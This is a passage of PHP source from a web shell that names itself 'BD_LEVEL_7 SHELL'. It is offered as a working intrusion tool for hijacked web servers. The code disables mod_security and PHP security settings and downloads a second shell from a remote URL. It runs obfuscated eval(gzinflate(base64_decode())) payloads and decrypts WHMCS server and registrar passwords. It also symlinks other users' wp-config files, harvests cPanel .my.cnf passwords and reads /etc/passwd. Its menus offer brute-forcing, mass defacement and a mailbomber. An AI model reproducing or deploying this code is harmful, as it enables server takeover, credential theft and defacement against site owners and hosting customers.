                                                                                $htaccess = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckCookieFormat Off
SecFilterCheckUnicodeEncoding Off
SecFilterNormalizeCookies Off
</IfModule>
<Limit GET POST>
order deny,allow
deny from all
allow from all
</Limit>
<Limit PUT DELETE>
order deny,allow
deny from all
</Limit>
SetEnv PHPRC $zero/ghost/php.ini";

                                                                                $phpini = "c2FmZV9tb2RlID0gT0ZGDQpTYWZlX21vZGVfZ2lkID0gT0ZGDQpkaXNhYmxlX2Z1bmN0aW9ucyA9IE5PTkUNCmRpc2FibGVfY2xhc3NlcyA9IE5PTkUNCm9wZW5fYmFzZWRpciA9IE9GRg0Kc3Vob3Npbi5leGVjdXRvci5mdW5jLmJsYWNrbGlzdCA9IE5PTkU=";
                                                                                $dir = "ghost";
                                                                                if(file_exists($dir)) {
                                                                                    echo "[+] ghost Folder Already Exist are you drunk :o xD !
";
                                                                                } else {
                                                                                    @mkdir($dir); {
                                                                                        echo "[+] ghost Folder Has Been Created Nygga :3 !
";
                                                                                    } }
#Generate Sh3LL
                                                                                $fopen = fopen("ghost/priv8.php5",'w');
                                                                                $shell = @file_get_contents($file);
                                                                                $swrite = fwrite($fopen ,$shell);
                                                                                if($swrite){
                                                                                    echo "Shell Has Been Downloaded : $zero/ghost/priv8.php5 
";
                                                                                } else {
                                                                                    echo "Can't Download Shell :( do it manually :D 
";
                                                                                }
                                                                                fclose($fopen);
#Generate Htaccess
                                                                                $kolsv = fopen("ghost/.htaccess", "w");
                                                                                $hwrite = fwrite($kolsv, $htaccess);
                                                                                if($hwrite){
                                                                                    echo ".htaccess Generated Successfully \!/";
                                                                                } else {
                                                                                    echo "Can't Generate Htaccess";
                                                                                }
                                                                                fclose($kolsv);
#Generate ini.php
                                                                                $xopen = fopen("ghost/ini.php",'w');
                                                                                $rim = @file_get_contents($mauritania);
                                                                                $zzz = fwrite($xopen ,$rim);
                                                                                if($zzz){
                                                                                    echo "ini.php Has Been Downloaded \!/";
                                                                                } else {
                                                                                    echo "Can't Download ini.php :( do it manually :D ";
                                                                                }
                                                                                fclose($xopen);

                                                                                $ini = fopen("ghost/php.ini" ,"w");
                                                                                $php = fwrite($ini, base64_decode($phpini));
                                                                                if($php){
                                                                                    echo "PHP.INI Generated Successfully \!/";
                                                                                } else {
                                                                                    echo "[-] Can't Generate PHP.INI";
                                                                                }
                                                                            }
                                                                            echo "</textarea></center>";
                                                                        }
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'ensimz'))
                                                                        {
                                                                            echo '<br><center><b>-=Enable Symlink If Disabled=-</b><center><br>';
                                                                            echo '<br><center><form method=post><br><br>
<input class= "inputzbut" type=submit name=ens value="Enable Symlink" /></form></center>';

                                                                            error_reporting(0);

                                                                            if(isset($_POST['ens']))
                                                                            {
                                                                                mkdir('ensim',0755);
                                                                                $rr  ='<Directory "/">
Options All
Options +FollowSymLinks
Options +SymLinksIfOwnerMatch
Options +ExecCGI
AllowOverride AuthConfig FileInfo Indexes Limit Options=Includes,Includes,Indexes,MultiViews,SymLinksIfOwnerMatch
</Directory>';
                                                                                $g = fopen('ensim/.htaccess','w');
                                                                                fwrite($g,$rr);
                                                                                echo "<br><br><font face='Tahoma' color='#ff0000' size='2pt'>Symlink Function Enabled Successfully in apache pre main conf</font></center>";
                                                                            }
                                                                        }
                                                                        /////////////////////////////////////////////////coeg///// /////////////////////////////
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'pytcpz')){@eval(gzinflate(base64_decode($pytcpz))); "</div>";}
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'simbyz')){@eval(gzinflate(base64_decode($simbyz))); "</div>";}
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'cpnlndftpotdfr')){@eval(gzinflate(base64_decode($cpnlndftpotdfr))); "</div>";}
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'indomieseleraku')){@eval(gzinflate(base64_decode($indomieseleraku))); "</div>";}
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'shellfinder')){@eval(gzinflate(base64_decode($shellfinder))); "</div>";}
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'mysql')){@eval(gzinflate(base64_decode($mysql))); "</div>";}
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'mpcz')){@eval(gzinflate(base64_decode($mpcz))); "</div>";}
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'mailfilter')){@eval(gzinflate(base64_decode($mailfilter))); "</div>";}
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'mailbomber')){@eval(gzinflate(base64_decode($mailbomber))); "</div>";}
                                                                        /////////////////////////////////////////////////coeg///// /////////////////////////////
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'bingreverse'))
                                                                        {
                                                                            ?>
                                                                            <br><br><br>
                                                                            <center><div id="sitelist"><a onClick="window.open('http://www.viewdns.info/reverseip/?host=<?php echo $_SERVER ['SERVER_ADDR']; ?>','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="http://www.viewdns.info/reverseip/?host=<?php echo $_SERVER ['SERVER_ADDR']; ?>"><div id='menu'>=> DNS Reverse IP <=</a></center>
                                                                            <br><br><br>
                                                                            <center><div id="sitelist"><a onClick="window.open('http://www.bing.com/search?q=ip%3A<?php echo $_SERVER ['SERVER_ADDR']; ?>+paypal','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="http://www.bing.com/search?q=ip%3A<?php echo $_SERVER ['SERVER_ADDR']; ?>+paypal"><div id='menu'>=> Paypal on Server <=</a></center>
                                                                            <br><br><br>
                                                                            <center><div id="visa"><a onClick="window.open('http://www.bing.com/search?q=ip%3A<?php echo $_SERVER ['SERVER_ADDR']; ?>+visa+master','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="http://www.bing.com/search?q=ip%3A<?php echo $_SERVER ['SERVER_ADDR']; ?>+visa+master"><div id='menu'>=> CC on Server <=</a></center>
                                                                            <?php
                                                                        }
                                                                        ///////////////////////////////////////////////////////////////////////////
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'whmcsdec'))
                                                                        {
                                                                        ?>
                                                                        <form action="?y=<?php echo $pwd; ?>&amp;x=whmcsdec" method="post">

                                                                            <?php

                                                                            function decrypt ($string,$cc_encryption_hash)
                                                                            {
                                                                                $key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
                                                                                $hash_key = _hash ($key);
                                                                                $hash_length = strlen ($hash_key);
                                                                                $string = base64_decode ($string);
                                                                                $tmp_iv = substr ($string, 0, $hash_length);
                                                                                $string = substr ($string, $hash_length, strlen ($string) - $hash_length);
                                                                                $iv = $out = '';
                                                                                $c = 0;
                                                                                while ($c < $hash_length)
                                                                                {
                                                                                    $iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
                                                                                    ++$c;
                                                                                }
                                                                                $key = $iv;
                                                                                $c = 0;
                                                                                while ($c < strlen ($string))
                                                                                {
                                                                                    if (($c != 0 AND $c % $hash_length == 0))
                                                                                    {
                                                                                        $key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
                                                                                    }
                                                                                    $out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
                                                                                    ++$c;
                                                                                }
                                                                                return $out;
                                                                            }

                                                                            function _hash ($string)
                                                                            {
                                                                                if (function_exists ('sha1'))
                                                                                {
                                                                                    $hash = sha1 ($string);
                                                                                }
                                                                                else
                                                                                {
                                                                                    $hash = md5 ($string);
                                                                                }
                                                                                $out = '';
                                                                                $c = 0;
                                                                                while ($c < strlen ($hash))
                                                                                {
                                                                                    $out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
                                                                                    $c += 2;
                                                                                }
                                                                                return $out;
                                                                            }

                                                                            echo "
<br><center><font size='5' color='#FFFFFF'><b>+--==[ WHMCS Decoder ]==--+</b></font></center>
<center>
<br>
 
<FORM action=''  method='post'>
<input type='hidden' name='form_action' value='2'>
<br>
<table class=tabnet style=width:320px;padding:0 1px;>
<tr><th colspan=2>WHMCS Decoder</th></tr>
<tr><td>db_host </td><td><input type='text' style='color:#FFFFFF;background-color:' class='inputz' size='38' name='db_host' value='localhost'></td></tr>
<tr><td>db_username </td><td><input type='text' style='color:#FFFFFF;background-color:' class='inputz' size='38' name='db_username' value=''></td></tr>
<tr><td>db_password</td><td><input type='text' style='color:#FFFFFF;background-color:' class='inputz' size='38' name='db_password' value=''></td></tr>
<tr><td>db_name</td><td><input type='text' style='color:#FFFFFF;background-color:' class='inputz' size='38' name='db_name' value=''></td></tr>
<tr><td>cc_encryption_hash</td><td><input style='color:#FFFFFF;background-color:' type='text' class='inputz' size='38' name='cc_encryption_hash' value=''></td></tr>
<td>&nbsp;&nbsp;&nbsp;&nbsp;<INPUT class='inputzbut' type='submit' style='color:#FFFFFF;background-color:'  value='Submit' name='Submit'></td>
</table>
</FORM>
</center>
";

                                                                            if($_POST['form_action'] == 2 )
                                                                            {
                                                                                //include($file);
                                                                                $db_host=($_POST['db_host']);
                                                                                $db_username=($_POST['db_username']);
                                                                                $db_password=($_POST['db_password']);
                                                                                $db_name=($_POST['db_name']);
                                                                                $cc_encryption_hash=($_POST['cc_encryption_hash']);



                                                                                $link=mysql_connect($db_host,$db_username,$db_password) ;
                                                                                mysql_select_db($db_name,$link) ;
                                                                                $query = mysql_query("SELECT * FROM tblservers");
                                                                                while($v = mysql_fetch_array($query)) {
                                                                                    $ipaddress = $v['ipaddress'];
                                                                                    $username = $v['username'];
                                                                                    $type = $v['type'];
                                                                                    $active = $v['active'];
                                                                                    $hostname = $v['hostname'];
                                                                                    echo("<center><table border='1'>");
                                                                                    $password = decrypt ($v['password'], $cc_encryption_hash);
                                                                                    echo("<tr><td>Type</td><td>$type</td></tr>");
                                                                                    echo("<tr><td>Active</td><td>$active</td></tr>");
                                                                                    echo("<tr><td>Hostname</td><td>$hostname</td></tr>");
                                                                                    echo("<tr><td>Ip</td><td>$ipaddress</td></tr>");
                                                                                    echo("<tr><td>Username</td><td>$username</td></tr>");
                                                                                    echo("<tr><td>Password</td><td>$password</td></tr>");

                                                                                    echo "</table><br><br></center>";
                                                                                }

                                                                                $link=mysql_connect($db_host,$db_username,$db_password) ;
                                                                                mysql_select_db($db_name,$link) ;
                                                                                $query = mysql_query("SELECT * FROM tblregistrars");
                                                                                echo("<center>Domain Reseller <br><table class=tabnet border='1'>");
                                                                                echo("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");
                                                                                while($v = mysql_fetch_array($query)) {
                                                                                    $registrar     = $v['registrar'];
                                                                                    $setting = $v['setting'];
                                                                                    $value = decrypt ($v['value'], $cc_encryption_hash);
                                                                                    if ($value=="") {
                                                                                        $value=0;
                                                                                    }
                                                                                    $password = decrypt ($v['password'], $cc_encryption_hash);
                                                                                    echo("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");
                                                                                }
                                                                            }
                                                                            }
                                                                            /////////////////////////////////////////////////coeg///// /////////////////////////////
                                                                            elseif(isset($_GET['x']) && ($_GET['x'] == 'about'))
                                                                            { ?>

                                                                                <center>
                                                                                    <b>BD_LEVEL_7 SHELL V1.0</b><br><b>Team: BD_LEVEL_7<br>Developed & Modified by Sid Gifari</b><br>
                                                                                     <br><b>Team: BD_LEVEL_7<br>THENKS TO:MAMA(Sid Gifari)</b><br>
                                                                                </center>
                                                                                <?php
                                                                            }
                                                                            /////////////////////////////////////////////////////////////////////////////////////////
                                                                            /////////////////////////////////////////////////halamanmenu///// ///////////////////////////////////////////////////////////////////////////////////////////////////////

                                                                            elseif(isset($_GET['x']) && ($_GET['x'] == 'bypasmenu'))
                                                                            {
                                                                            ?>
                                                                            <br><br><b><center>-=Bypass Menu=-</b><center><br><div id="menu" align="center">
                                                                                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=grasy">Bypass /etc/passwd</a><br><br>
                                                                                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=nemcon">Bypass Users Server</a><br><br>
                                                                                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=cgipl">Bypass Perl Security</a><br><br>
                                                                                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=pytcpz">Bypass Forbidden with Python via TCP Protocol</a><br><br>
                                                                                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=bypsrootwzp">Bypass Root Path with Zip File</a><br><br>
                                                                                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=bforb">Bypass Root Path with system function</a><br><br>
                                                                                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=rootexecbpass">Bypass Root Path with exec function</a><br><br>
                                                                                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=rootshelleexecbpass">Bypass Root Path with shell_exec function</a><br><br>
                                                                                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=posget">Bypass posix_getpwuid</a><br><br>
                                                                                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=suphp">Bypass PHP Suhosin function blacklist</a><br><br>
                                                                                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=suppet">Bypass Functions suPHP_ConfigPath</a><br><br>
                                                                                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=setphr">Bypass suPHP Security</a><br><br>
                                                                                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=simpelb">Simple Bypasser</a><br><br>
                                                                                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=ritf">Read Files</a><br><br>
                                                                                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=baidir">Bypass Chmod Directory</a><br><br>
                                                                                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=forb14">Bypass Forbidden 2014</a><br><br>
                                                                                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=smod14">Bypass SafeMode 2014 Priv8</a><br><br></center>
                                                                            <br></div>
<?php
}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////ancox///// ///////////////////////////////////////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'symlinkmenu'))
{
    ?>
    <br><br><b><center>-=Symlink Menu=-</b><center><br><div id="menu" align="center">
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=symsr">Symlink Server</a><br><br>
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=symfil">Symlink File</a><br><br>
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=symlink">Symlink Server 2</a><br><br>
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=domainv">Domain Viewer</a><br><br>
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=ensimz">Enable Symlink If Disable</a><br><br>
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=pytcpz">Bypass Forbidden with Python via TCP Protocol</a><br><br>
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=simbyz">Symlink Bypass 2014</a><br><br>
</center>
    <br></div>
	
	<?php
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////ancox///// ///////////////////////////////////////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'autoxploit'))
{
    ?>
    <br><br><b><center>-=[ Auto Exploiter ]=-</b><center><br><div id="menu" align="center">
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=drupkit">Drupal Mass Scanner</a><br><br>
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=xlang">Xammp Lang Mass Scanner</a><br><br>
</center>
    <br></div>
	
    <?php
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////ancox///// ///////////////////////////////////////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'wpmenu'))
{
    ?>
    <br><br><b><center>-=Wordpress Tools=-</b><center><br><div id="menu" align="center">
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=wpnu">Wordpress Auto Deface</a><br><br>
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=wpbrute">Wordpress BruteForce</a><br><br>
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=wp-reset">Wordpress Reset Password</a><br><br>
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=mpcz">WordPress Mass Password Changer</a><br><br>

</center>
    <br></div>
    <?php
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////ancox///// ///////////////////////////////////////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'jmmenu'))
{
    ?>
    <br><br><b><center>-=Joomla Tools=-</b><center><br><div id="menu" align="center">
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=jmnu">Joomla Auto Deface</a><br><br>
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=jbrute">Joomla BruteForce</a><br><br>
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=jm-reset">Joomla Reset Password</a><br><br>

</center>
    <br></div>
    <?php
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////ancox///// ///////////////////////////////////////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'bfmenu'))
{
    ?>
    <br><br><b><center>-=Bruteforce Menu=-</b><center><br><div id="menu" align="center">
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=fbrute">Facebook BruteForce</a><br><br>
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=tbrute">Twitter BruteForce</a><br><br>
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=gbrute">Email Bruteforce</a><br><br>
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=wpbrute">WordPress BruteForce</a><br><br>
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=jbrute">Joomla BruteForce</a><br><br>
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=brute">Cpanel BruteForce</a><br><br></center>
    <br></div>
    <?php
}
/////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'cpmenu'))
{
    ?>
    <br><br><b><center>-=Cpanel Menu=-</b><center><br><div id="menu" align="center">
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=cpauto">Cpanel Auto Crack</a><br><br>
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=brute">Cpanel BruteForce</a><br><br>
        <a href="?<?php echo "y=".$pwd; ?>&amp;x=cpnlndftpotdfr">Cpanel & FTP Auto Deface</a><br><br>
</center>
    <br></div>
    <?php
}
/////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'litespeedconfig')){ @eval(gzinflate(base64_decode($litespeedconfig))); "</div>"; }
elseif(isset($_GET['x']) && ($_GET['x'] == 'grabconfig')){
    ?>
    <center>
        <form action="?y=<?php echo $pwd; ?>&x=grabconfig" method="post">
            <br><br><center><b><font size=4>-=Config Grabber=-</font></b></center><br>
        <?php
        echo "
<form method='POST'>
</head>
<style>
textarea {
resize:none;
color: #000000 ;
background-color:#000000;  
font-size:8pt; color:#ffffff;
border:1px solid white ;
border-left: 4px solid white ;
width:543px;
height:400px;
}
input {
color: #000000;
border:1px dotted white;
}
</style>";
        echo "<center>";?></center><br><center><?php if (empty($_POST['config'])) { ?><p><font face="Tahoma" color="#007700" size="2pt">/etc/passwd content</p><br><form method="POST"><textarea name="passwd" class='area' rows='15' cols='60'><?php echo file_get_contents('/etc/passwd'); ?></textarea><br><br><input name="config" class='inputzbut' size="100" value="Grab!" type="submit"><br></form></center><br><?php }if ($_POST['config']) {$function = $functions=@ini_get("disable_functions");if(eregi("symlink",$functions)){die ('<error>Symlink disabled :( </error>');}@mkdir('bhconfig', 0755);@chdir('bhconfig');
        $htaccess="
OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI
Options Indexes FollowSymLinks
ForceType text/plain
AddType text/plain .php 
AddType text/plain .html
AddType text/html .shtml
AddType txt .php
AddHandler server-parsed .php
AddHandler txt .php
AddHandler txt .html
AddHandler txt .shtml
Options All
Options All";
        file_put_contents(".htaccess",$htaccess,FILE_APPEND);$passwd=$_POST["passwd"];
        $passwd=explode("\n",$passwd);
        echo "<br><br><center><font color=#b0b000 size=2pt>wait ...</center><br>";
        foreach($passwd as $pwd){
            $pawd=explode(":",$pwd);$user =$pawd[0];
            @symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-wp13.txt');
            @symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-wp13-wp.txt');
            @symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-wp13-WP.txt');
            @symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$user.'-wp13-wp-beta.txt');
            @symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp13-beta.txt');
            @symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-wp13-press.txt');
            @symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-wp13-wordpress.txt');
            @symlink('/home/'.$user.'/public_html/Wordpress/wp-config.php',$user.'-wp13-Wordpress.txt');
            @symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.txt');
            @symlink('/home/'.$user.'/public_html/config.php',$user.'-configgg.txt');
            @symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-wp13-news.txt');
            @symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-wp13-new.txt');
            @symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp-blog.txt');
            @symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp-beta.txt');
            @symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-wp-blogs.txt');
            @symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-wp-home.txt');
            @symlink('/home/'.$user.'/public_html/db.php',$user.'-dbconf.txt');
            @symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-wp-site.txt');
            @symlink('/home/'.$user.'/public_html/main/wp-config.php',$user.'-wp-main.txt');
            @symlink('/home/'.$user.'/public_html/configuration.php',$user.'-wp-test.txt');
            @symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-joomla2.txt');
            @symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-joomla-protal.txt');
            @symlink('/home/'.$user.'/public_html/joo/configuration.php',$user.'-joo.txt');
            @symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-joomla-cms.txt');
            @symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-joomla-site.txt');
            @symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-joomla-main.txt');
            @symlink('/home/'.$user.'/public_html/news/configuration.php',$user.'-joomla-news.txt');
            @symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-joomla-new.txt');
            @symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-joomla-home.txt');
            @symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vb-config.txt');
            @symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm15.txt');
            @symlink('/home/'.$user.'/public_html/central/configuration.php',$user.'-whm-central.txt');
            @symlink('/home/'.$user.'/public_html/whm/whmcs/configuration.php',$user.'-whm-whmcs.txt');
            @symlink('/home/'.$user.'/public_html/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.txt');
            @symlink('/home/'.$user.'/public_html/whmc/WHM/configuration.php',$user.'-whmc-WHM.txt');
            @symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-whmcs.txt');
            @symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-support.txt');
            @symlink('/home/'.$user.'/public_html/configuration.php',$user.'-joomla.txt');
            @symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-whmcs2.txt');
            @symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm.txt');}
        echo '<b class="cone"><font face="Tahoma" color="#00dd00" size="2pt"><b>Done -></b> <a target="_blank" href="bhconfig">Open configs</a></font></b>';}

    ?>
    <?php



}
elseif(isset($_GET['x']) && ($_GET['x'] == 'mailerz')){@eval(gzinflate(base64_decode($mailerz))); "</div>";}
elseif(isset($_GET['x']) && ($_GET['x'] == 'cpauto')){

?>
<center>
    <br>
    <br><b>-= Auto Cpanel Finder =- <br></b><br>
    <?php
   
    @ini_set('display_errors',0);
    function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
        $ar0=explode($marqueurDebutLien, $text);
        $ar1=explode($marqueurFinLien, $ar0[$i]);
        return trim($ar1[0]);
    }


    echo "<center>";
    $d0mains = @file('/etc/named.conf');
    $domains = scandir("/var/named");

    if ($domains or $d0mains)
    {
        $domains = scandir("/var/named");
        if($domains) {
            echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
            $count=1;
            $dc = 0;
            $list = scandir("/var/named");
            foreach($list as $domain){
                if(strpos($domain,".db")){
                    $domain = str_replace('.db','',$domain);
                    $owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
                    $dirz = '/home/'.$owner['name'].'/.my.cnf';
                    $path = getcwd();

                    if (is_readable($dirz)) {
                        copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
                        $p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
                        $password=entre2v2($p,'password="','"');
                        echo "<tr><td>".$count++."</td><td><a href='http://".$domain.":2082' target='_blank'>".$domain."</a></td><td>".$owner['name']."</td><td>".$password."</td><td><a href='".$owner['name'].".txt' target='_blank'>Click Here</a></td></tr>";
                        $dc++;
                    }

                }
            }
            echo '</table>';
            $total = $dc;
            echo '<br><div class="result">Total cPanel Found = '.$total.'</h3><br />';
            echo '</center>';
        }else{
            $d0mains = @file('/etc/named.conf');
            if($d0mains) {
                echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
                $count=1;
                $dc = 0;
                $mck = array();
                foreach($d0mains as $d0main){
                    if(@eregi('zone',$d0main)){
                        preg_match_all('#zone "(.*)"#',$d0main,$domain);
                        flush();
                        if(strlen(trim($domain[1][0])) >2){
                            $mck[] = $domain[1][0];
                        }
                    }
                }
                $mck = array_unique($mck);
                $usr = array();
                $dmn = array();
                foreach($mck as $o) {
                    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
                    $usr[] = $infos['name'];
                    $dmn[] = $o;
                }
                array_multisort($usr,$dmn);
                $dt = file('/etc/passwd');
                $passwd = array();
                foreach($dt as $d) {
                    $r = explode(':',$d);
                    if(strpos($r[5],'home')) {
                        $passwd[$r[0]] = $r[5];
                    }
                }
                $l=0;
                $j=1;
                foreach($usr as $r) {
                    $dirz = '/home/'.$r.'/.my.cnf';
                    $path = getcwd();
                    if (is_readable($dirz)) {
                        copy($dirz, ''.$path.'/'.$r.'.txt');
                        $p=file_get_contents(''.$path.'/'.$r.'.txt');
                        $password=entre2v2($p,'password="','"');
                        echo "<tr><td>".$count++."</td><td><a target='_blank' href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td>'.$r."</td><td>".$password."</td><td><a href='".$r.".txt' target='_blank'>Click Here</a></td></tr>";
                        $dc++;
                        flush();
                        $l=$l?0:1;
                        $j++;
                    }
                }
            }
            echo '</table>';
            $total = $dc;
            echo '<br><div class="result">Total cPanel Found = '.$total.'</h3><br />';
            echo '</center>';

        }
    }else{
        echo "<div class='result'><i><font color='#FF0000'>ERROR</font><br><font color='#FF0000'>/var/named</font> or <font color='#FF0000'>etc/named.conf</font> Not Accessible!</i></div>";
    }


    echo "<br><br>";
    ?>
        
		
		
		
		
        <?php

        }
        elseif(isset($_GET['x']) && ($_GET['x'] == 'jumpingz')){
            ?>
            <center><br><br><h1>-=Jumping Server Scanner=-<h1>
                        <?php
                        ($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<font size="4" color="blue" face="Calibri"><b>Error: Safe_mode = On</b></font>');
                        set_time_limit(0);@$passwd = fopen('/etc/passwd','r');if (!$passwd) { die('<font size="4" color="blue" face="Calibri"><b>[-] Error : Coudn`t Read /etc/passwd</b></font>');
                        }
                        $pub = array();$users = array();$conf = array();$i = 0;while(!feof($passwd)){$str = fgets($passwd);if ($i > 100){ $pos = strpos($str,':');  $username = substr($str,0,$pos);  $dirz = '/home/'.$username.'/public_html/';  if (($username != '')) { if (is_readable($dirz)) { array_push($users,$username);  array_push($pub,$dirz); }}}$i++;}
                        echo '<font size="3" color="#008080" face="Calibri">         [-]==================[ START ]==================[-] <br><br></font>';
                        foreach ($users as $user){echo "<font size='3' color='red' face='Calibri'> [+] <a href = '".basename($_SERVER['PHP_SELF'])."?y=/home/$user/public_html/' target='_blank'>/home/$user/public_html/</a></font><br/>";} echo "\n <font size='3' color='#008080' face='Calibri'><br>[-]==================[ FINISH ]==================[-] <br></font>\n"; echo "\n <font size='2' color='#800000' face='Calibri'>[+] Scanners have been completed | Thank you for using this tools [+]</font>\n"; echo '</body></html>'; ?>
            </center>
            <?php
        }
        elseif(isset($_GET['x']) && ($_GET['x'] == 'massdeface2')){
        ?>
        <form action="?y=<?php echo $pwd; ?>&x=massdeface2" method="post"><br>	<center><div id="menu"><a href="?<?php echo "y=".$pwd; ?>&amp;x=sabun">Mass Deface v2.0</a>  <a href="?<?php echo "y=".$pwd; ?>&amp;x=massdeface2">Alternate Mass Deface</a>  <a href="?<?php echo "y=".$pwd; ?>&amp;x=mass">Mass Deface</a></center><br>
            <center>
                <b> -= Alternate Mass Deface index.php =- </b><br><br>
                <?php
                error_reporting(0);
                echo "<center><textarea style='background:black;outline:none;' name='index' rows='10' cols='67'>";
                $defaceurl = $_POST['massdefaceurl'];
                $dir = $_POST['massdefacedir'];
                echo $dir."\n";

                if (is_dir($dir)) {
                    if ($dh = opendir($dir)) {
